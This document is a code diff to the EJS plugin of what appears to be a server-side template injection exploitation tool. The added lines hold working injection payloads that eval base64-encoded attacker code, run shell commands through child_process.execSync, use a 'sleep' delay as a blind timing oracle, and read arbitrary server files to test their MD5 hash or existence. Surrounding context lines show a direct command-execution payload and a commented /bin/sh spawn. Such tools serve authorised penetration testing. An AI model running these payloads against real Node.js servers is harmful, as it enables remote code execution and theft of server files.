@@ -42,6 +42,10 @@ class Ejs(javascript.Javascript):
                 'call': 'inject',
                 'evaluate_blind': """<%=[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]%>"""
             },
+            'evaluate_blind': {
+                'call': 'inject',
+                'evaluate_blind': """<%=eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')%>"""
+            },
             'execute': {
                 'execute': """<%= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString()) %>"""
                 #'execute': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
@@ -74,6 +78,11 @@ class Ejs(javascript.Javascript):
             },
             'md5_error': {
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
+            },
+            'md5_blind': {
+                'call': 'evaluate_blind',
+                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
+                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
             },
         })
 
